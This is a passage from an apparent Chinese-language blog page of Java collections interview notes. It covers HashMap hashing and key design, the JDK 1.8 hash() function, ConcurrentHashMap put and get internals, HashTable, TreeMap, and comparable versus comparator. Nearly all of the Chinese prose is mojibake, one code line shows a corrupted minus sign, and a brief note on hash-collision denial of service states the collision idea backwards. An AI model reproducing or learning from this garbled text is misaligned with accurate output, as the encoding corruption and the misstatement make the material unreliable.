ConcurrentHashMap ã€‚</p>
<p>è¯¦æƒ…è¯·æŸ¥çœ‹ï¼š<a href="https://coolshell.cn/articles/9606.html">https://coolshell.cn/articles/9606.html</a></p>
<h4 id="Hash-Collision-Dosé—®é¢˜"><a href="#Hash-Collision-Dosé—®é¢˜" class="headerlink" title="Hash Collision Dosé—®é¢˜"></a>Hash Collision Dosé—®é¢˜</h4><p>è¿™ä¸ªå®‰å…¨å¼±ç‚¹åˆ©ç”¨äº†å„è¯­è¨€çš„Hashç®—æ³•çš„â€œééšæœºæ€§â€å¯ä»¥åˆ¶é€ å‡ºNå¤šçš„valueä¸ä¸€æ ·ï¼Œä½†æ˜¯keyä¸€æ ·æ•°æ®ï¼Œç„¶åè®©ä½ çš„Hashè¡¨æˆä¸ºä¸€å¼ å•å‘é“¾è¡¨ï¼Œè€Œå¯¼è‡´ä½ çš„æ•´ä¸ªç½‘ç«™æˆ–æ˜¯ç¨‹åºçš„è¿è¡Œæ€§èƒ½ä»¥çº§æ•°ä¸‹é™ï¼ˆå¯ä»¥å¾ˆè½»æ¾çš„è®©ä½ çš„CPUå‡åˆ°100%ï¼‰</p>
<h4 id="èƒ½å¦ä½¿ç”¨ä»»ä½•ç±»ä½œä¸º-Map-çš„-keyï¼Ÿ"><a href="#èƒ½å¦ä½¿ç”¨ä»»ä½•ç±»ä½œä¸º-Map-çš„-keyï¼Ÿ" class="headerlink" title="èƒ½å¦ä½¿ç”¨ä»»ä½•ç±»ä½œä¸º Map çš„ keyï¼Ÿ"></a>èƒ½å¦ä½¿ç”¨ä»»ä½•ç±»ä½œä¸º Map çš„ keyï¼Ÿ</h4><p>å¯ä»¥ä½¿ç”¨ä»»ä½•ç±»ä½œä¸º Map çš„ keyï¼Œç„¶è€Œåœ¨ä½¿ç”¨ä¹‹å‰ï¼Œéœ€è¦è€ƒè™‘ä»¥ä¸‹å‡ ç‚¹ï¼š  å¦‚æœç±»é‡å†™äº† equals() æ–¹æ³•ï¼Œä¹Ÿåº”è¯¥é‡å†™ hashCode() æ–¹æ³•ã€‚ç±»çš„æ‰€æœ‰å®ä¾‹éœ€è¦éµå¾ªä¸ equals() å’Œ hashCode() ç›¸å…³çš„è§„åˆ™ã€‚</p>
<p>å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰ä½¿ç”¨ equals()ï¼Œä¸åº”è¯¥åœ¨ hashCode() ä¸­ä½¿ç”¨å®ƒã€‚</p>
<p>ç”¨æˆ·è‡ªå®šä¹‰ Key ç±» ä½³å®è·µæ˜¯ä½¿ä¹‹ä¸ºä¸å¯å˜çš„ï¼Œè¿™æ · hashCode() å€¼å¯ä»¥è¢«ç¼“å­˜èµ·æ¥ï¼Œæ‹¥æœ‰æ›´å¥½çš„æ€§èƒ½ã€‚ä¸å¯å˜çš„ç±»ä¹Ÿå¯ä»¥ç¡®ä¿ hashCode() å’Œ equals() åœ¨æœªæ¥ä¸ä¼šæ”¹å˜ï¼Œè¿™æ ·å°±ä¼šè§£å†³ä¸å¯å˜ç›¸å…³çš„é—®é¢˜äº†ã€‚</p>
<h4 id="åœ¨ä½¿ç”¨-HashMap-çš„æ—¶å€™ï¼Œç”¨-String-åš-key-æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ"><a href="#åœ¨ä½¿ç”¨-HashMap-çš„æ—¶å€™ï¼Œç”¨-String-åš-key-æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ" class="headerlink" title="åœ¨ä½¿ç”¨ HashMap çš„æ—¶å€™ï¼Œç”¨ String åš key æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ"></a>åœ¨ä½¿ç”¨ HashMap çš„æ—¶å€™ï¼Œç”¨ String åš key æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</h4><p>HashMap å†…éƒ¨å®ç°æ˜¯é€šè¿‡ key çš„ hashcode æ¥ç¡®å®š value çš„å­˜å‚¨ä½ç½®ï¼Œå› ä¸ºå­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œæ‰€ä»¥å½“åˆ›å»ºå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒçš„ hashcode è¢«ç¼“å­˜ä¸‹æ¥ï¼Œä¸éœ€è¦å†æ¬¡è®¡ç®—ï¼Œæ‰€ä»¥ç›¸æ¯”äºå…¶ä»–å¯¹è±¡æ›´å¿«ã€‚</p>
<p>Stringã€Integerç­‰åŒ…è£…ç±»çš„ç‰¹æ€§èƒ½å¤Ÿä¿è¯Hashå€¼çš„ä¸å¯æ›´æ”¹æ€§å’Œè®¡ç®—å‡†ç¡®æ€§ï¼Œèƒ½å¤Ÿæœ‰æ•ˆçš„å‡å°‘Hashç¢°æ’çš„å‡ ç‡</p>
<ol>
<li>éƒ½æ˜¯finalç±»å‹ï¼Œå³ä¸å¯å˜æ€§ï¼Œä¿è¯keyçš„ä¸å¯æ›´æ”¹æ€§ï¼Œä¸ä¼šå­˜åœ¨è·å– hashå€¼ä¸åŒçš„æƒ…å†µ</li>
</ol>
<p>å†…éƒ¨å·²é‡å†™äº†equals()ã€hashCode()ç­‰æ–¹æ³•ï¼Œéµå®ˆäº†HashMapå†…éƒ¨çš„è§„èŒƒï¼ˆä¸æ¸…æ¥šå¯ä»¥å»ä¸Šé¢çœ‹çœ‹putValueçš„è¿‡ç¨‹ï¼‰ï¼Œä¸å®¹æ˜“å‡ºç°Hashå€¼è®¡ç®—é”™è¯¯çš„æƒ…å†µ</p>
<h4 id="å¦‚æœä½¿ç”¨Objectä½œä¸ºHashMapçš„Keyï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ"><a href="#å¦‚æœä½¿ç”¨Objectä½œä¸ºHashMapçš„Keyï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ" class="headerlink" title="å¦‚æœä½¿ç”¨Objectä½œä¸ºHashMapçš„Keyï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ"></a>å¦‚æœä½¿ç”¨Objectä½œä¸ºHashMapçš„Keyï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</h4><p>ç­”ï¼šé‡å†™hashCode()å’Œequals()æ–¹æ³•</p>
<ol>
<li><p>é‡å†™hashCode()æ˜¯å› ä¸ºéœ€è¦è®¡ç®—å­˜å‚¨æ•°æ®çš„å­˜å‚¨ä½ç½®ï¼Œéœ€è¦æ³¨æ„ä¸è¦è¯•å›¾ä»æ•£åˆ—ç è®¡ç®—ä¸­æ’é™¤æ‰ä¸€ä¸ªå¯¹è±¡çš„å…³é”®éƒ¨åˆ†æ¥æé«˜æ€§èƒ½ï¼Œè¿™æ ·è™½ç„¶èƒ½æ›´å¿«ä½†å¯èƒ½ä¼šå¯¼è‡´æ›´å¤šçš„Hashç¢°æ’ï¼›</p>
</li>
<li><p>é‡å†™equals()æ–¹æ³•ï¼Œéœ€è¦éµå®ˆè‡ªåæ€§ã€å¯¹ç§°æ€§ã€ä¼ é€’æ€§ã€ä¸€è‡´æ€§ä»¥åŠå¯¹äºä»»ä½•énullçš„å¼•ç”¨å€¼xï¼Œx.equals(null)å¿…é¡»è¿”å›falseçš„è¿™å‡ ä¸ªç‰¹æ€§ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¿è¯keyåœ¨å“ˆå¸Œè¡¨ä¸­çš„å”¯ä¸€æ€§</p>
</li>
</ol>
<h4 id="HashMapä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨hashCode-å¤„ç†åçš„å“ˆå¸Œ-å€¼ç›´æ¥ä½œä¸ºtableçš„ä¸‹æ ‡ï¼Ÿ"><a href="#HashMapä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨hashCode-å¤„ç†åçš„å“ˆå¸Œ-å€¼ç›´æ¥ä½œä¸ºtableçš„ä¸‹æ ‡ï¼Ÿ" class="headerlink" title="HashMapä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨hashCode()å¤„ç†åçš„å“ˆå¸Œ å€¼ç›´æ¥ä½œä¸ºtableçš„ä¸‹æ ‡ï¼Ÿ"></a>HashMapä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨hashCode()å¤„ç†åçš„å“ˆå¸Œ å€¼ç›´æ¥ä½œä¸ºtableçš„ä¸‹æ ‡ï¼Ÿ</h4><p>ç­”ï¼šhashCode()æ–¹æ³•è¿”å›çš„æ˜¯intæ•´æ•°ç±»å‹ï¼Œå…¶èŒƒå›´ä¸º-(2 ^ 31)<del>(2 ^ 31 - 1)ï¼Œçº¦æœ‰40äº¿ä¸ªæ˜ å°„ç©ºé—´ï¼Œè€ŒHashMapçš„å®¹é‡èŒƒå›´æ˜¯åœ¨16ï¼ˆåˆå§‹åŒ–é»˜è®¤å€¼ï¼‰</del>2 ^ 30ï¼ŒHashMapé€šå¸¸æƒ…å†µä¸‹æ˜¯å–ä¸åˆ°å¤§å€¼çš„ï¼Œå¹¶ä¸”è®¾å¤‡ä¸Šä¹Ÿéš¾ä»¥æä¾›è¿™ä¹ˆå¤šçš„å­˜å‚¨ç©ºé—´ï¼Œä»è€Œå¯¼è‡´é€šè¿‡hashCode()è®¡ç®—å‡ºçš„å“ˆå¸Œå€¼å¯èƒ½ä¸åœ¨æ•°ç»„å¤§å°èŒƒå›´å†…ï¼Œè¿›è€Œæ— æ³•åŒ¹é…å­˜å‚¨ä½ç½®ï¼›</p>
<ol>
<li><p>HashMapè‡ªå·±å®ç°äº†è‡ªå·±çš„hash()æ–¹æ³•ï¼Œé€šè¿‡ä¸¤æ¬¡æ‰°åŠ¨ä½¿å¾—å®ƒè‡ªå·±çš„å“ˆå¸Œå€¼é«˜ä½ä½è‡ªè¡Œè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œé™ä½å“ˆå¸Œç¢°æ’æ¦‚ç‡ä¹Ÿä½¿å¾—æ•°æ®åˆ†å¸ƒæ›´å¹³å‡ï¼›</p>
</li>
<li><p>åœ¨ä¿è¯æ•°ç»„é•¿åº¦ä¸º2çš„å¹‚æ¬¡æ–¹çš„æ—¶å€™ï¼Œä½¿ç”¨hash()è¿ç®—ä¹‹åçš„å€¼ä¸è¿ç®—ï¼ˆ&amp;ï¼‰ï¼ˆæ•°ç»„é•¿åº¦ - 1ï¼‰æ¥è·å–æ•°ç»„ä¸‹æ ‡çš„æ–¹å¼è¿›è¡Œå­˜å‚¨ï¼Œè¿™æ ·ä¸€æ¥æ˜¯æ¯”å–ä½™æ“ä½œæ›´åŠ æœ‰æ•ˆç‡ï¼ŒäºŒæ¥ä¹Ÿæ˜¯å› ä¸ºåªæœ‰å½“æ•°ç»„é•¿åº¦ä¸º2çš„å¹‚æ¬¡æ–¹æ—¶ï¼Œh&amp;(length-1)æ‰ç­‰ä»·äºh%lengthï¼Œä¸‰æ¥è§£å†³äº†â€œå“ˆå¸Œå€¼ä¸æ•°ç»„å¤§å°èŒƒå›´ä¸åŒ¹é…â€çš„é—®é¢˜</p>
</li>
</ol>
<h4 id="HashMap-putVal"><a href="#HashMap-putVal" class="headerlink" title="HashMap putVal"></a>HashMap putVal</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848502.png" alt="image-20210502162723163"></p>
<h4 id="è§£å†³hashå†²çªé—®é¢˜"><a href="#è§£å†³hashå†²çªé—®é¢˜" class="headerlink" title="è§£å†³hashå†²çªé—®é¢˜"></a>è§£å†³hashå†²çªé—®é¢˜</h4><p>æ‹‰é“¾æ³•; ä½¿ç”¨ä¸¤æ¬¡æ‰°åŠ¨å‡½æ•°(hashå‡½æ•°); å¼•å…¥çº¢é»‘æ ‘;</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¦‚æœåªæ˜¯å•çº¯çš„ç”¨hashCodeå–ä½™æ¥è·å–å¯¹åº”çš„bucketè¿™å°†ä¼šå¤§å¤§å¢åŠ å“ˆå¸Œç¢°æ’çš„æ¦‚ç‡ï¼Œå¹¶ä¸”æœ€åæƒ…å†µä¸‹è¿˜ä¼šå°†HashMapå˜æˆä¸€ä¸ªå•é“¾è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å¯¹hashCodeä½œä¸€å®šçš„ä¼˜åŒ– hash()å‡½æ•°</p>
<p>ä¸Šé¢æåˆ°çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸ºå¦‚æœä½¿ç”¨hashCodeå–ä½™ï¼Œé‚£ä¹ˆç›¸å½“äºå‚ä¸è¿ç®—çš„åªæœ‰hashCodeçš„ä½ä½ï¼Œé«˜ä½æ˜¯æ²¡æœ‰èµ·åˆ°ä»»ä½•ä½œç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯è®© hashCodeå–å€¼å‡ºçš„é«˜ä½ä¹Ÿå‚ä¸è¿ç®—ï¼Œè¿›ä¸€æ­¥é™ä½hashç¢°æ’çš„æ¦‚ç‡ï¼Œä½¿å¾—æ•°æ®åˆ†å¸ƒæ›´å¹³å‡ï¼Œæˆ‘ä»¬æŠŠè¿™æ ·çš„æ“ä½œç§°ä¸ºæ‰°åŠ¨ï¼Œåœ¨JDK 1.8ä¸­çš„hash()å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	static final int hash(Object key) &#123;</span><br><span class="line">2	int h;</span><br><span class="line">3	return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);// ä¸è‡ªå·±å³ç§»16ä½è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼ˆé«˜ä½ä½å¼‚æˆ–ï¼‰</span><br><span class="line">4	&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ¯”åœ¨JDK 1.7ä¸­ï¼Œæ›´ä¸ºç®€æ´ï¼Œç›¸æ¯”åœ¨1.7ä¸­çš„4æ¬¡ä½è¿ç®—ï¼Œ5æ¬¡å¼‚æˆ–è¿ç®—ï¼ˆ9æ¬¡æ‰°åŠ¨ï¼‰ï¼Œåœ¨1.8ä¸­ï¼Œåªè¿›è¡Œäº†1æ¬¡ä½è¿ç®—å’Œ1æ¬¡å¼‚æˆ–è¿ç®—ï¼ˆ2æ¬¡æ‰°åŠ¨ï¼‰ï¼›</p>
<h3 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h3><p>Jdk1.7 åˆ†æ®µæ•°ç»„+é“¾è¡¨, jdk1.8 æ•°ç»„+é“¾è¡¨&#x2F;çº¢é»‘æ ‘; jdk1.7 é‡‡ç”¨åˆ†æ®µé”,æ¯æŠŠé”åªé”ä¸€éƒ¨åˆ†æ•°æ®;</p>
<p>jdk 1.8 é‡‡ç”¨ CAS å’Œ synchronized æ¥ä¿è¯å¹¶å‘å®‰å…¨;synchronized åªé”å®šå½“å‰é“¾è¡¨æˆ–çº¢é»‘äºŒå‰æ ‘çš„é¦–èŠ‚ç‚¹ï¼Œè¿™æ ·åªè¦ hash ä¸å†²çªï¼Œå°±ä¸ä¼šäº§ç”Ÿå¹¶å‘ï¼Œæ•ˆç‡åˆæå‡ N å€;ConcurrentHashMap çš„åˆå§‹åŒ–æ˜¯é€šè¿‡è‡ªæ—‹å’Œ CAS æ“ä½œå®Œæˆçš„;</p>
<p>å»ºå€¼å¯¹ä¸èƒ½ä¸ºç©º;</p>
<p>å»ºè®®æ ¹æ®éœ€æ±‚ç»™åˆå§‹å®¹é‡,ä»¥é˜²åæœŸæ‰©å®¹å¾ˆè€—æ—¶,ç»™32çš„è¯å®é™…æ˜¯64;</p>
<p>sizeCtl:</p>
<ol>
<li>-1 è¯´æ˜æ­£åœ¨åˆå§‹åŒ–</li>
<li>-N è¯´æ˜æœ‰N-1ä¸ªçº¿ç¨‹æ­£åœ¨è¿›è¡Œæ‰©å®¹</li>
<li>è¡¨ç¤º table åˆå§‹åŒ–å¤§å°ï¼Œå¦‚æœ table æ²¡æœ‰åˆå§‹åŒ–</li>
<li>è¡¨ç¤º table å®¹é‡ï¼Œå¦‚æœ tableã€€å·²ç»åˆå§‹åŒ–ã€‚</li>
</ol>
<p>putæºç :</p>
<ol>
<li>æ ¹æ® key è®¡ç®—å‡º hashcode ã€‚</li>
<li>åˆ¤æ–­æ˜¯å¦éœ€è¦è¿›è¡Œåˆå§‹åŒ–ã€‚</li>
<li>å³ä¸ºå½“å‰ key å®šä½å‡ºçš„ Nodeï¼Œå¦‚æœä¸ºç©ºè¡¨ç¤ºå½“å‰ä½ç½®å¯ä»¥å†™å…¥æ•°æ®ï¼Œåˆ©ç”¨ CAS å°è¯•å†™å…¥ï¼Œå¤±è´¥åˆ™è‡ªæ—‹ä¿è¯æˆåŠŸã€‚</li>
<li>å¦‚æœå½“å‰ä½ç½®çš„ <code>hashcode == MOVED == -1</code>,åˆ™éœ€è¦è¿›è¡Œæ‰©å®¹ã€‚</li>
<li>å¦‚æœéƒ½ä¸æ»¡è¶³ï¼Œåˆ™åˆ©ç”¨ synchronized é”å†™å…¥æ•°æ®ã€‚</li>
<li>å¦‚æœæ•°é‡å¤§äº <code>TREEIFY_THRESHOLD</code> åˆ™è¦è½¬æ¢ä¸ºçº¢é»‘æ ‘ã€‚</li>
</ol>
<p>getæºç :</p>
<ol>
<li>æ ¹æ® hash å€¼è®¡ç®—ä½ç½®ã€‚</li>
<li>æŸ¥æ‰¾åˆ°æŒ‡å®šä½ç½®ï¼Œå¦‚æœå¤´èŠ‚ç‚¹å°±æ˜¯è¦æ‰¾çš„ï¼Œç›´æ¥è¿”å›å®ƒçš„ value.</li>
<li>å¦‚æœå¤´èŠ‚ç‚¹ hash å€¼å°äº 0 ï¼Œè¯´æ˜æ­£åœ¨æ‰©å®¹æˆ–è€…æ˜¯çº¢é»‘æ ‘ï¼ŒæŸ¥æ‰¾ä¹‹ã€‚</li>
<li>å¦‚æœæ˜¯é“¾è¡¨ï¼Œéå†æŸ¥æ‰¾ä¹‹ã€‚</li>
</ol>
<p>æ’å…¥å…ƒç´ è¿‡ç¨‹ï¼š</p>
<p>å¦‚æœç›¸åº”ä½ç½®çš„Nodeè¿˜æ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆ™è°ƒç”¨CASæ’å…¥ç›¸åº”çš„æ•°æ®ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	else if ((f = tabAt(tab, i = (n â€ 1) &amp; hash)) == null) &#123;</span><br><span class="line">2	if (casTabAt(tab, i, null, new Node&lt;K,V&gt;(hash, key, value, null)))</span><br><span class="line">3	break; // no lock when adding to empty bin</span><br><span class="line">4	&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›¸åº”ä½ç½®çš„Nodeä¸ä¸ºç©ºï¼Œä¸”å½“å‰è¯¥èŠ‚ç‚¹ä¸å¤„äºç§»åŠ¨çŠ¶æ€ï¼Œåˆ™å¯¹è¯¥èŠ‚ç‚¹åŠ </p>
<p>synchronizedé”ï¼Œå¦‚æœè¯¥èŠ‚ç‚¹çš„hashä¸å°äº0ï¼Œåˆ™éå†é“¾è¡¨æ›´æ–°èŠ‚ç‚¹æˆ–æ’å…¥æ–°èŠ‚ç‚¹ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 if (fh &gt;= 0) &#123; </span><br><span class="line">2 binCount = 1;</span><br><span class="line">3	for (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">4	K ek;</span><br><span class="line">5	if (e.hash == hash &amp;&amp;</span><br><span class="line">6	((ek = e.key) == key ||</span><br><span class="line">7	(ek != null &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">8	oldVal = e.val;</span><br><span class="line">9	if (!onlyIfAbsent)</span><br><span class="line">10	e.val = value;</span><br><span class="line">11	break;</span><br><span class="line">12	&#125;</span><br><span class="line">13	Node&lt;K,V&gt; pred = e;</span><br><span class="line">14	if ((e = e.next) == null) &#123;</span><br><span class="line">15	pred.next = new Node&lt;K,V&gt;(hash, key, value, null);</span><br><span class="line">16	break;</span><br><span class="line">17	&#125;</span><br><span class="line">18	&#125;</span><br><span class="line">19	&#125;</span><br></pre></td></tr></table></figure>

<p>\1.    å¦‚æœè¯¥èŠ‚ç‚¹æ˜¯TreeBinç±»å‹çš„èŠ‚ç‚¹ï¼Œè¯´æ˜æ˜¯çº¢é»‘æ ‘ç»“æ„ï¼Œåˆ™é€šè¿‡ putTreeValæ–¹æ³•å¾€çº¢é»‘æ ‘ä¸­æ’å…¥èŠ‚ç‚¹ï¼›å¦‚æœbinCountä¸ä¸º0ï¼Œè¯´æ˜putæ“ä½œå¯¹æ•°æ®äº§ç”Ÿäº†å½±å“ï¼Œå¦‚æœå½“å‰é“¾è¡¨çš„ä¸ªæ•°è¾¾åˆ°8ä¸ªï¼Œåˆ™é€šè¿‡treeifyBinæ–¹æ³•è½¬åŒ–ä¸ºçº¢é»‘æ ‘ï¼Œå¦‚æœoldValä¸ä¸ºç©ºï¼Œè¯´æ˜æ˜¯ä¸€æ¬¡æ›´æ–°æ“ä½œï¼Œæ²¡æœ‰å¯¹å…ƒç´ ä¸ªæ•°äº§ç”Ÿå½±å“ï¼Œåˆ™ç›´æ¥è¿”å›æ—§å€¼ï¼›</p>
<p>\2.    å¦‚æœæ’å…¥çš„æ˜¯ä¸€ä¸ªæ–°èŠ‚ç‚¹ï¼Œåˆ™æ‰§è¡ŒaddCount()æ–¹æ³•å°è¯•æ›´æ–°å…ƒç´ ä¸ªæ•° baseCountï¼›</p>
<h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>é»˜è®¤11, æ‰©å®¹2n+ 1;çº¿ç¨‹å®‰å…¨,æ‰€æœ‰æ–¹æ³•éƒ½ç”¨sychronizedä¿®é¥°;ä¸å…è®¸nullé”®å’Œå€¼;æ²¡æœ‰è½¬çº¢é»‘æ ‘çš„æœºåˆ¶;å¦‚ä½¿ç”¨ put æ·»åŠ å…ƒç´ ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä¸èƒ½ä½¿ç”¨ put æ·»åŠ å…ƒç´ , ä¹Ÿä¸èƒ½ä½¿ç”¨ get;</p>
<h3 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h3><p>ç”¨äºè·å–é…ç½®æ–‡ä»¶å€¼,key-valueå½¢å¼</p>
<h3 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h3><p>ç›¸æ¯”äºHashMapæ¥è¯´ TreeMap ä¸»è¦å¤šäº†å¯¹é›†åˆä¸­çš„å…ƒç´ æ ¹æ®é”®æ’åºçš„èƒ½åŠ›ä»¥åŠå¯¹é›†åˆå†…å…ƒç´ çš„æœç´¢çš„èƒ½åŠ›ã€‚</p>
<h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848696.jpg" alt="LinkedHashMapæºç è¯¦ç»†åˆ†æï¼ˆJDK1.8ï¼‰_"></p>
<h3 id="å¦‚ä½•å†³å®šä½¿ç”¨-HashMap-è¿˜æ˜¯TreeMapï¼Ÿ"><a href="#å¦‚ä½•å†³å®šä½¿ç”¨-HashMap-è¿˜æ˜¯TreeMapï¼Ÿ" class="headerlink" title="å¦‚ä½•å†³å®šä½¿ç”¨ HashMap è¿˜æ˜¯TreeMapï¼Ÿ"></a>å¦‚ä½•å†³å®šä½¿ç”¨ HashMap è¿˜æ˜¯TreeMapï¼Ÿ</h3><p>å¯¹äºåœ¨Mapä¸­æ’å…¥ã€åˆ é™¤å’Œå®šä½å…ƒç´ è¿™ç±»æ“ä½œï¼ŒHashMapæ˜¯å¥½çš„é€‰æ‹©ã€‚ç„¶è€Œï¼Œå‡å¦‚ä½ éœ€è¦å¯¹ä¸€ä¸ªæœ‰åºçš„keyé›†åˆè¿›è¡Œéå†ï¼ŒTreeMapæ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚åŸºäºä½ çš„collectionçš„å¤§å°ï¼Œä¹Ÿè®¸å‘HashMapä¸­æ·»åŠ å…ƒç´ ä¼šæ›´å¿«ï¼Œå°†mapæ¢ä¸ºTreeMapè¿›è¡Œæœ‰åºkeyçš„éå†</p>
<h3 id="Array-å’Œ-ArrayList-æœ‰ä½•åŒºåˆ«ï¼Ÿ"><a href="#Array-å’Œ-ArrayList-æœ‰ä½•åŒºåˆ«ï¼Ÿ" class="headerlink" title="Array å’Œ ArrayList æœ‰ä½•åŒºåˆ«ï¼Ÿ"></a>Array å’Œ ArrayList æœ‰ä½•åŒºåˆ«ï¼Ÿ</h3><ul>
<li>Array å¯ä»¥å­˜å‚¨åŸºæœ¬æ•°æ®ç±»å‹å’Œå¯¹è±¡ï¼ŒArrayList åªèƒ½å­˜å‚¨å¯¹è±¡ã€‚</li>
<li>Array æ˜¯æŒ‡å®šå›ºå®šå¤§å°çš„ï¼Œè€Œ ArrayList å¤§å°æ˜¯è‡ªåŠ¨æ‰©å±•çš„ã€‚</li>
<li>Array å†…ç½®æ–¹æ³•æ²¡æœ‰ ArrayList å¤šï¼Œæ¯”å¦‚ addAllã€removeAllã€iteration ç­‰æ–¹æ³•åªæœ‰ ArrayList æœ‰ã€‚</li>
</ul>
<p>å¯¹äºåŸºæœ¬ç±»å‹æ•°æ®ï¼Œé›†åˆä½¿ç”¨è‡ªåŠ¨è£…ç®±æ¥å‡å°‘ç¼–ç å·¥ä½œé‡ã€‚ä½†æ˜¯ï¼Œå½“å¤„ç†å›ºå®šå¤§å°çš„åŸºæœ¬æ•°æ®ç±»å‹çš„æ—¶å€™ï¼Œè¿™ç§æ–¹å¼ç›¸å¯¹æ¯”è¾ƒæ…¢ã€‚</p>
<h3 id="å¦‚ä½•å®ç°-Array-å’Œ-List-ä¹‹é—´çš„è½¬æ¢ï¼Ÿ"><a href="#å¦‚ä½•å®ç°-Array-å’Œ-List-ä¹‹é—´çš„è½¬æ¢ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç° Array å’Œ List ä¹‹é—´çš„è½¬æ¢ï¼Ÿ"></a>å¦‚ä½•å®ç° Array å’Œ List ä¹‹é—´çš„è½¬æ¢ï¼Ÿ</h3><ul>
<li>Array è½¬ Listï¼š Arrays. asList(array) ï¼›</li>
<li>List è½¬ Arrayï¼šList çš„ toArray() æ–¹æ³•ã€‚</li>
</ul>
<h3 id="comparable-å’Œ-comparatorçš„åŒºåˆ«ï¼Ÿ"><a href="#comparable-å’Œ-comparatorçš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="comparable å’Œ comparatorçš„åŒºåˆ«ï¼Ÿ"></a>comparable å’Œ comparatorçš„åŒºåˆ«ï¼Ÿ</h3><ul>
<li>comparableæ¥å£å®é™…ä¸Šæ˜¯å‡ºè‡ªjava.langåŒ…ï¼Œå®ƒæœ‰ä¸€ä¸ª compareTo(Object obj)æ–¹æ³•ç”¨æ¥æ’åº</li>
<li>comparatoræ¥å£å®é™…ä¸Šæ˜¯å‡ºè‡ª java.util åŒ…ï¼Œå®ƒæœ‰ä¸€ä¸ªcompare(Object obj1, Object obj2)æ–¹æ³•ç”¨æ¥æ’åº</li>
</ul>
<p>ä¸€èˆ¬æˆ‘ä»¬éœ€è¦å¯¹ä¸€ä¸ªé›†åˆä½¿ç”¨è‡ªå®šä¹‰æ’åºæ—¶ï¼Œæˆ‘ä»¬å°±è¦é‡å†™compareToæ–¹æ³•æˆ– compareæ–¹æ³•ï¼Œå½“æˆ‘ä»¬éœ€è¦å¯¹æŸä¸€ä¸ªé›†åˆå®ç°ä¸¤ç§æ’åºæ–¹å¼ï¼Œæ¯”å¦‚ä¸€ä¸ªsongå¯¹è±¡ä¸­çš„æ­Œåå’Œæ­Œæ‰‹ååˆ†åˆ«é‡‡ç”¨ä¸€ç§æ’åºæ–¹æ³•çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥é‡å†™compareToæ–¹æ³•å’Œä½¿ç”¨è‡ªåˆ¶çš„Comparatoræ–¹æ³•æˆ–è€…ä»¥ä¸¤ä¸ªComparatoræ¥å®ç°æ­Œåæ’åºå’Œæ­Œæ˜Ÿåæ’åºï¼Œç¬¬äºŒç§ä»£è¡¨æˆ‘ä»¬åªèƒ½ä½¿ç”¨ä¸¤ä¸ªå‚æ•°ç‰ˆçš„Collections.sort().</p>
<h3 id="Collection-å’Œ-Collections-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#Collection-å’Œ-Collections-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="Collection å’Œ Collections æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>Collection å’Œ Collections æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3><ul>
